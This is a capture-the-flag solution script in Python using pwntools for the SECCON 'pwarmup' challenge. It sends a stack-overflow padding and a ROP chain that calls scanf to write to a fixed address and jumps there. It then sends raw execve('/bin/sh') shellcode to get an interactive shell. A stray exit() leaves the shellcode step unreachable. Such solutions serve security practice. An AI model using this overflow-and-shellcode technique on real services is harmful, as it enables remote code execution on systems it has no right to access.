# https://qiita.com/kusano_k/items/0ec2a09483eaa7b900d1#pwarmup-warmup

from pwn import *

s = remote("pwn-neko.chal.seccon.jp", 9001)
elf = ELF("chall") # elf file
context.binary = elf

rop = ROP(elf)

rop.call(0x4005c0, [next(elf.search(b"%s")), 0x600000])
# rop.call(scanf@plt_addr, [args])
rop.call(0x600000)
s.sendlineafter(
        "Welcome to Pwn Warmup!\n",
        b"a"*0x28 + rop.chain()
        )

print(rop.dump())
exit()

s.sendline(
        "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
        "\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
        )
s.interactive()
